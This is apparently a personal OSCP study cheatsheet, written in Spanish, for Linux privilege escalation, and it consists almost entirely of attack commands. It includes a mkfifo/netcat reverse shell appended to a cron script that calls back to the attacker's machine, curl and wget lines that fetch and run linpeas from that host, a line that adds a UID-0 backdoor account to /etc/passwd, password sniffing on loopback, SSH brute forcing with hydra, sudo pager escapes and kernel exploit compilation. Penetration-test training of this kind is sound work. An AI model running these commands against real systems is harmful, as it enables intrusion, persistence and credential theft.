---
tipo: cheatsheet
tags: [oscp, cheatsheet]
---

# Cheatsheet: Privesc Linux

> [!info] Comandos añadidos a medida que avanzo en los módulos.

## Enumeración manual (baseline)
```bash
id ; cat /etc/passwd ; hostname
cat /etc/issue ; cat /etc/os-release ; uname -a
ps aux
ip a ; routel ; ss -anp
cat /etc/iptables/rules.v4
ls -lah /etc/cron* ; crontab -l ; sudo crontab -l
dpkg -l    # o: rpm -qa
find / -writable -type d 2>/dev/null
cat /etc/fstab ; mount ; lsblk
lsmod ; modinfo <modulo>
```

## SUID / SGID / capabilities
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
ps u -C <binario> ; grep Uid /proc/<PID>/status
```

## Enumeración automatizada
```bash
unix-privesc-check standard > output.txt
curl http://<IP_kali>/linpeas.sh | sh
# alternativa: servir y descargar explícitamente
python3 -m http.server 8000                      # en Kali
wget http://<IP_kali>:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

## Rastros del usuario / credenciales expuestas
```bash
env
cat ~/.bashrc
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

## Secretos en el historial de Git — ver [[Minar el Historial de Git en Busca de Secretos]]
```bash
git log --all --oneline
git show <hash_commit>                 # diff de un commit — qué se borró del HEAD actual
git log -p -- <ruta/fichero>           # historial de cambios de un fichero concreto
sudo apt install -y gitleaks && gitleaks detect     # complemento, no sustituye la revisión manual
```

## Diccionarios y fuerza bruta dirigida
```bash
crunch 6 6 -t Lab%%% > wordlist
hydra -l <user> -P wordlist <IP> -t 4 ssh -V
```

## Cron jobs
```bash
grep "CRON" /var/log/syslog
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_kali> <puerto> >/tmp/f' >> <script>
nc -lnvp <puerto>
```

## /etc/passwd escribible
```bash
ls -la /etc/passwd
openssl passwd <password>
echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

## sudo (GTFOBins) — ver [[Abusing Sudo (GTFOBins)]]
```bash
sudo -l
aa-status
cat /var/log/syslog | grep <binario>
sudo apt-get changelog apt    # ejemplo GTFOBins; dentro de 'less': !/bin/sh
# git: escape vía el pager interno (less) que invoca 'git help'/'git -p'
sudo git -p help config       # dentro del pager: !/bin/bash
```

## Exploits de kernel
```bash
cat /etc/issue ; uname -r ; arch
searchsploit "linux kernel <distro> <version> Local Privilege Escalation"
gcc <exploit>.c -o <exploit>
```
</content>
